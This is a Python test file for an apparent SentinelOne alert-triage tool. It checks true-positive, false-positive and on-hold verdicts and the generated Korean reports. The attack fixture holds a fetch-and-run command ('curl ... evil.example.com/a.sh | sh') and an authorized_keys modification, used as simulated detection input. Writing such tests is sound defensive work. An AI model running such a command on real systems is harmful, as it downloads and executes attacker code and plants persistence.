from s1triage.analyzer import analyze_events
from s1triage.client import Threat
from s1triage.enrichment import TiVerdict
from s1triage.narrative import build_conclusion, build_outputs
from s1triage.report import TriageReport

ATTACK = [
    {"eventType": "Login", "loginsUserName": "root", "loginIsSuccessful": "false", "srcIp": "45.1.2.3", "createdAt": "2026-11-03T04:52:51Z"},
    {"eventType": "Process Creation", "srcProcName": "bash", "srcProcParentName": "sshd", "tgtProcName": "curl",
     "tgtProcCmdLine": "curl http://evil.example.com/a.sh | sh", "createdAt": "2026-11-03T04:52:53Z"},
    {"eventType": "File Modification", "srcProcName": "bash", "srcProcParentName": "sshd",
     "tgtFilePath": "/root/.ssh/authorized_keys", "createdAt": "2026-11-03T04:52:54Z"},
]
BENIGN = [{"eventType": "File Modification", "srcProcName": "sshd", "srcProcParentName": "systemd",
           "srcProcCmdLine": "/usr/sbin/sshd -D", "tgtFilePath": "/var/log/btmp"}]


def report(events, ti=None, error=None, confidence="suspicious"):
    t = Threat("123", "evil", "SL-1", "2026-11-03T04:52:58Z", agent_name="web01", confidence_level=confidence)
    return TriageReport(t, analyze_events(events) if events is not None else None, ti or [], error).to_dict()


def test_attack_is_true_positive_with_kill_chain_and_actions():
    c = build_conclusion(report(ATTACK))
    assert c["verdict"] == "정탐 가능성 높음"
    tactics = [k["tactic"] for k in c["kill_chain"]]
    assert tactics == sorted(tactics, key=["초기 침투", "실행", "지속성", "권한 상승", "방어 회피", "인증정보 접근", "탐색",
                                           "측면 이동", "수집", "명령제어(C2)", "유출", "영향"].index)
    assert "지속성" in tactics and "실행" in tactics
    assert any("authorized_keys" in a for a in c["actions"])
    assert any("Mitigate" in a for a in c["actions"])
    assert any("bash" in r for r in c["root_cause"])


def test_benign_daemon_is_false_positive():
    c = build_conclusion(report(BENIGN))
    assert c["verdict"] == "오탐 가능성 높음"
    assert c["kill_chain"] == []
    assert any("False Positive" in a for a in c["actions"])


def test_no_events_or_error_is_on_hold():
    assert build_conclusion(report([]))["verdict"] == "판단 보류"
    assert build_conclusion(report(None, error="429"))["verdict"] == "판단 보류"


def test_malicious_ti_alone_raises_verdict():
    ti = [TiVerdict("AbuseIPDB", "ip", "45.1.2.3", True, "score 100")]
    c = build_conclusion(report([{"eventType": "IP Connect", "srcProcName": "x", "dstIp": "45.1.2.3", "dstPort": 443}], ti=ti))
    assert c["verdict"] == "정탐 가능성 높음"


def test_text_outputs():
    o = build_outputs(report(ATTACK))
    assert o["main_report"].startswith("# 정밀 분석 보고서")
    assert "## 4. 킬체인" in o["main_report"]
    assert "용어 설명" in o["beginner_guide"] and "Storyline" in o["beginner_guide"]
    assert o["console_note"].startswith("[자동 트리아지")
    assert len(o["console_note"]) <= 1800
